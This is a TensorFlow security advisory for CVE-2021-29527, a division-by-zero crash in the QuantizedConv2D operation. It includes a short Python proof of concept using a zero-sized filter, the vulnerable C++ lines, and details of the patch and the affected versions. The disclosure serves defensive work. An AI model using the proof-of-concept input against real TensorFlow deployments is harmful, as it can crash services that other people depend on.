## TFSA-2021-016: Division by 0 in `QuantizedConv2D`

### CVE Number
CVE-2021-29527

### Impact
An attacker can trigger a division by 0 in `tf.raw_ops.QuantizedConv2D`:

```python
import tensorflow as tf

input = tf.zeros([1, 1, 1, 1], dtype=tf.quint8)
filter = tf.constant([], shape=[1, 0, 1, 1], dtype=tf.quint8)
min_input = tf.constant(0.0)
max_input = tf.constant(0.0001)
min_filter = tf.constant(0.0)
max_filter = tf.constant(0.0001)
strides = [1, 1, 1, 1]
padding = "SAME"


tf.raw_ops.QuantizedConv2D(input=input, filter=filter, min_input=min_input, max_input=max_input, min_filter=min_filter, max_filter=max_filter, strides=strides, padding=padding)
```

This is because the
[implementation](https://github.com/tensorflow/tensorflow/blob/00e9a4d67d76703fa1aee33dac582acf317e0e81/tensorflow/core/kernels/quantized_conv_ops.cc#L257-L259) does a division by a quantity that is controlled by the caller:

```cc
const int filter_value_count = filter_width * filter_height * input_depth;
const int64 patches_per_chunk = kMaxChunkSize / (filter_value_count * sizeof(T1));
```

### Patches
We have patched the issue in GitHub commit
[cfa91be9863a91d5105a3b4941096044ab32036b](https://github.com/tensorflow/tensorflow/commit/cfa91be9863a91d5105a3b4941096044ab32036b).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
2.1.4, as these are also affected and still in supported range.
